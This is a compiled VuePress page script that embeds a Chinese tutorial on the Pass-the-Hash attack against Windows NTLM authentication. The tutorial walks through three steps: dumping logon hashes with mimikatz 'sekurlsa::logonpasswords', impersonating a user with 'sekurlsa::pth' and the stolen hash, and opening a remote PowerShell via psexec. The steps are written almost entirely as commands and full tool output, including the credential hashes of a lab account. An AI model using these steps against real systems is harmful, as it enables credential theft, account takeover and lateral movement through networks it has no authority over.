import{_ as e,K as n,L as i,W as s}from"./framework-edebdfe1.js";const d={},l=s(`<h1 id="pass-the-hash" tabindex="-1"><a class="header-anchor" href="#pass-the-hash" aria-hidden="true">#</a> Pass-The-Hash</h1><p>Pass-the-Hash是一种凭证盗窃和横向移动技术，攻击者滥用 NTLM 身份验证协议以用户身份进行身份验证，而无需获得帐户的明文密码。由于攻击者使用密码散列，通常仅在密码本身更改时才会更改，因此攻击者有大量时间滥用受感染的帐户。</p><h2 id="攻击步骤" tabindex="-1"><a class="header-anchor" href="#攻击步骤" aria-hidden="true">#</a> 攻击步骤</h2><ul><li>获取用户HASH</li></ul><div class="language-JS line-numbers-mode" data-ext="JS"><pre class="language-JS"><code>mimikatz

sekurlsa::logonpasswords

Authentication Id : 0 ; 485931 (00000000:00076a2b)
Session           : RemoteInteractive from 2
User Name         : vagrant
Domain            : DEELMIND
Logon Server      : ROOT
Logon Time        : 10/27/2022 10:38:39 AM
SID               : S-1-5-21-3330634377-1326264276-632209373-1000
        msv :
         [00000003] Primary
         * Username : vagrant
         * Domain   : DEELMIND
         * NTLM     : e02bc503339d51f71d913c245d35b50b
         * SHA1     : c805f88436bcd9ff534ee86c59ed230437505ecf
         * DPAPI    : 3cfc6375c63f5ba465ab84fdf22d6ffe
        tspkg :
        wdigest :
         * Username : vagrant
         * Domain   : DEELMIND
         * Password : (null)
        kerberos :
         * Username : vagrant
         * Domain   : DEELMIND.LAB
         * Password : (null)
        ssp :
        credman :
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>PTH</li></ul><div class="language-JS line-numbers-mode" data-ext="JS"><pre class="language-JS"><code>privilege::debug

sekurlsa::pth /user:vagrant /domain:deelmind.lab /ntlm:e02bc503339d51f71d913c245d35b50b

mimikatz # sekurlsa::pth /user:vagrant /domain:deelmind.lab /ntlm:e02bc503339d51f71d913c245d35b50b
user    : vagrant
domain  : deelmind.lab
program : cmd.exe
impers. : no
NTLM    : e02bc503339d51f71d913c245d35b50b
  |  PID  33544
  |  TID  1360
  |  LSA Process is now R/W
  |  LUID 0 ; 20418271 (00000000:01378edf)
  \\_ msv1_0   - data copy @ 00000152E3CB6640 : OK !
  \\_ kerberos - data copy @ 00000152E3BB7F48
   \\_ des_cbc_md4       -&gt; null
   \\_ des_cbc_md4       OK
   \\_ des_cbc_md4       OK
   \\_ des_cbc_md4       OK
   \\_ des_cbc_md4       OK
   \\_ des_cbc_md4       OK
   \\_ des_cbc_md4       OK
   \\_ *Password replace @ 00000152E2C6EBE8 (32) -&gt; null
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>连接SHELL</li></ul><div class="language-JS line-numbers-mode" data-ext="JS"><pre class="language-JS"><code>psexec64.exe \\\\root powershell
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,9),a=[l];function r(v,c){return n(),i("div",null,a)}const u=e(d,[["render",r],["__file","pth.html.vue"]]);export{u as default};
